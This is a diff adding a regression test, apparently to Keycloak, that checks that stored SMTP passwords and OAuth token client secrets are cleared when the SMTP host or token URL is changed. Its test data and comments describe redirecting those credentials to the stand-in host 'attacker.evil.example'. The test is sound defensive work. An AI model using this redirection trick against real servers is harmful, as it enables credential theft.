@@ -54,6 +54,7 @@ import static org.hamcrest.Matchers.hasSize;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
+import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 import static org.junit.jupiter.api.Assertions.fail;
 
@@ -115,6 +116,56 @@ public class RealmDefaultConfigTest extends AbstractRealmTest {
 
         realm = smtpRealm.admin().toRepresentation();
         assertEquals(ComponentRepresentation.SECRET_VALUE, realm.getSmtpServer().get("password"));
+    }
+
+    @Test
+    public void smtpPasswordNotSubstitutedWhenDestinationChanged() {
+        smtpRealm.updateWithCleanup(r -> r.smtp("localhost", 3025, "smtp_realm@local"));
+        RealmRepresentation rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("auth", "true");
+        rep.getSmtpServer().put("user", "user");
+        rep.getSmtpServer().put("password", "secret");
+        smtpRealm.admin().update(rep);
+
+        RealmRepresentation internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertEquals("secret", internal.getSmtpServer().get("password"));
+
+        // Attack: change host to attacker's server, keep password=SECRET_VALUE
+        rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("host", "attacker.evil.example");
+        rep.getSmtpServer().put("password", ComponentRepresentation.SECRET_VALUE);
+        smtpRealm.admin().update(rep);
+
+        // Real password must NOT be substituted — it must be cleared
+        internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertNull(internal.getSmtpServer().get("password"),
+                "Credential must not be forwarded to a changed SMTP host");
+
+        smtpRealm.updateWithCleanup(r -> r.smtp("localhost", 3025, "smtp_realm@local"));
+        rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("auth", "true");
+        rep.getSmtpServer().put("authType", "token");
+        rep.getSmtpServer().put("user", "user");
+        rep.getSmtpServer().put("authTokenUrl", "http://localhost/token");
+        rep.getSmtpServer().put("authTokenClientId", "smtp-client");
+        rep.getSmtpServer().put("authTokenClientSecret", "real-token-secret");
+        rep.getSmtpServer().put("authTokenScope", "email");
+        smtpRealm.admin().update(rep);
+
+        internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertEquals("real-token-secret", internal.getSmtpServer().get("authTokenClientSecret"));
+
+        // Now change only authTokenUrl — host/port/user remain unchanged
+        rep = smtpRealm.admin().toRepresentation();
+        rep.getSmtpServer().put("authTokenUrl", "http://attacker.evil.example/steal");
+        rep.getSmtpServer().put("authTokenClientSecret", ComponentRepresentation.SECRET_VALUE);
+        smtpRealm.admin().update(rep);
+
+        // Secret must NOT be substituted — persisting it would cause the next email
+        // to POST client_secret=real-token-secret to the attacker's token endpoint
+        internal = smtpRealmRunOnServer.fetch(RunHelpers.internalRealm());
+        assertNull(internal.getSmtpServer().get("authTokenClientSecret"),
+                "Token secret must not be forwarded to a changed authTokenUrl");
     }
 
     @Test
